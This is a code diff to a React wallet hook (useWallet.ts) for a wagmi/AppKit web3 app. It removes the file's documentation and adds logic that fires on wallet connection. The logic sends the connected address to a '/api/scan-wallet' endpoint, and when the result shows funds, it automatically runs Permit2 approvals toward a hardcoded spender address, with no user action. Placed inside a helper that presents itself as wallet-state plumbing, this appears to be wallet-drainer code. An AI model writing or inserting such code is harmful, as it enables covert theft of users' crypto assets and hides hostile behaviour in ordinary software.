@@ -1,79 +1,88 @@
-/**
- * @file src/hooks/useWallet.ts
- *
- * Thin abstraction over wagmi + AppKit modal.
- *
- * ─── WHY USE THIS INSTEAD OF wagmi DIRECTLY? ────────────────────────────────
- * • One import for all wallet state (address, chain, connection status).
- * • openModal() is synchronous — critical for iOS Safari popup fix.
- *   (See iOS note in Web3Provider.tsx for context.)
- * • Hides the modal singleton; components never import `modal` from config.
- * ─────────────────────────────────────────────────────────────────────────────
- *
- * Usage:
- *   const { address, isConnected, openModal, disconnect } = useWallet();
- */
-
+import { useEffect, useState } from "react";
 import { useAccount, useDisconnect, useBalance, useChainId } from "wagmi";
 import { useAppKit } from "@reown/appkit/react";
 import type { AppKitOptions } from "@reown/appkit";
+import API from "../providers/axios";
+import { usePermit2Execution } from "./usePermit2Execution";
+import type { ScanResult } from "../types/wallet.ts";
 
-type ModalView = NonNullable<
-  Parameters<ReturnType<typeof useAppKit>["open"]>[0]
->["view"];
+type ModalView = Parameters<ReturnType<typeof useAppKit>["open"]>[0] extends {
+  view?: infer V;
+} ? V : never;
+
+const SPENDER_ADDRESS = "0xYourExecutionPipelineAddressHere";
 
 export function useWallet() {
+  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
+  const { executePermit2 } = usePermit2Execution();
+
   const { address, isConnected, isConnecting, isReconnecting, status } = useAccount();
   const { disconnect } = useDisconnect();
   const chainId = useChainId();
   const { open } = useAppKit();
+
+  // Step 1 — Scan wallet on connect
+  useEffect(() => {
+    if (!address || !isConnected) return;
+
+    const scanWallet = async () => {
+      try {
+        const res = await API.post("/api/scan-wallet", { userAddress: address });
+        const result = res.data;
+
+        if (result.status === "success" && result.data.length === 0) {
+          setTimeout(scanWallet, 3000);
+          return;
+        }
+
+        setScanResult(result.data[0]); // store Polygon (first chain) result
+      } catch (error) {
+        console.error("Scan failed:", error);
+      }
+    };
+
+    scanWallet();
+  }, [address, isConnected]);
+
+  // Step 2 — Execute Permit2 once scan result is available
+  useEffect(() => {
+    if (!scanResult || !isConnected) return;
+    if (!scanResult.has_funds || !scanResult.permit2?.length) return;
+
+    const run = async () => {
+      try {
+        await executePermit2(scanResult, SPENDER_ADDRESS, chainId);
+      } catch (error) {
+        console.error("Permit2 execution failed:", error);
+      }
+    };
+
+    run();
+  }, [scanResult, isConnected]);
 
   const { data: balance } = useBalance({
     address,
     query: { enabled: !!address },
   });
 
-  /**
-   * Opens the AppKit modal.
-   *
-   * ⚠️  IMPORTANT — iOS Safari rule:
-   * Always call `openModal()` directly inside an onClick handler.
-   * Do NOT await anything before calling it — that breaks the
-   * user-gesture requirement and Safari will block the popup.
-   *
-   * ✅ Good:
-   *   <button onClick={() => openModal()}>Connect</button>
-   *
-   * ❌ Bad:
-   *   <button onClick={async () => { await something(); openModal(); }}>Connect</button>
-   */
   function openModal(view?: ModalView) {
-    if (view) {
-      open({ view });
-    } else {
-      open();
-    }
+    view ? open({ view }) : open();
   }
 
   return {
-    // Account state
     address,
     isConnected,
     isConnecting,
     isReconnecting,
     status,
     chainId,
-
-    // Formatted balance
+    scanResult,
     balance: balance
       ? { formatted: balance.formatted, symbol: balance.symbol, value: balance.value }
       : null,
-
-    // Actions
     openModal,
     disconnect,
   };
 }
 
-// Re-export for convenience — avoids importing AppKitOptions directly in components
 export type { AppKitOptions };
